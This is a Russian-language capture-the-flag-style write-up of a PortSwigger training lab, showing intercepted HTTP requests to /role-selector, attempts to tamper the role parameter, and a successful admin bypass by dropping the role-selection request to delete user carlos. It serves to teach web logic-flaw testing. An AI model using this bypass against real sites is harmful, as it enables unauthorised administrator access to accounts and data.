---
title: "Authentication bypass via flawed state machine"
date: 2025-10-30
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine"
classes: wide
---

Для прохождения лабы нужно получить доступ к аккаунту администратора и удалить пользователя `carlos`. Для входа в учетную запись есть креды `wiener`:`peter`.

```
https://0a7d00c304dd9178827a330300a600ca.web-security-academy.net/
```

# Solution

Вперед в учетку)

Это было внезапно.

```http
POST /role-selector HTTP/2
Host: 0a7d00c304dd9178827a330300a600ca.web-security-academy.net
Cookie: session=d5gicbuzzvFBTszMXU8zGyws9d9yTmmk
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a7d00c304dd9178827a330300a600ca.web-security-academy.net/role-selector
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: https://0a7d00c304dd9178827a330300a600ca.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

role=content-author&csrf=jJii9eIKoEOGtiAKj8i2pUwZQA5oIsmW
```

Я человек простой: вижу `role` - ставлю `admin`.

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
Set-Cookie: session=JuesfTYtgBj0RbgzKLYC5J1LbDgBe3KX; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 31

"No login credentials provided"
```

Что-то не пошло( Попробую еще раз. Разлогинюсь. Введу креды. Перехвачу пакет с выбором роли, чтобы заменить ее на `administrator`:

```http
POST /role-selector HTTP/2
Host: 0a7d00c304dd9178827a330300a600ca.web-security-academy.net
Cookie: session=g7fJ0eBjmVSx55xEG0oxe4QOlzJH0akB
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a7d00c304dd9178827a330300a600ca.web-security-academy.net/role-selector
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Origin: https://0a7d00c304dd9178827a330300a600ca.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

role=administrator&csrf=1uDMZJN1fr3NXI3kQIn5WBzucYEZYYoC
```

Все прошло, но админки я так и не получил(

```http
HTTP/2 302 Found
Location: /
Set-Cookie: session=W7MeSejaUN2nhyw2k0sLXviGquW64LU7; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Хм. А что будет, если мы не выставим роль? Попробую сразу перейти на лк после ввода кред. Иии... меня выкинуло на форму `login`:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_authentication-bypass-via-flawed-state-machine/1.png){: height="200" .align-center}

Попробую не отправлять ответ на `/role-selector`. Просто дропну его через прокcи:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_authentication-bypass-via-flawed-state-machine/2.png){: height="200" .align-center}

Сайт решил, что мы админ. Ну бывает)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_authentication-bypass-via-flawed-state-machine/3.png){: height="200" .align-center}

Удалю пользователя `carlos`, чтобы решить лабу)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_authentication-bypass-via-flawed-state-machine/4.png){: height="200" .align-center}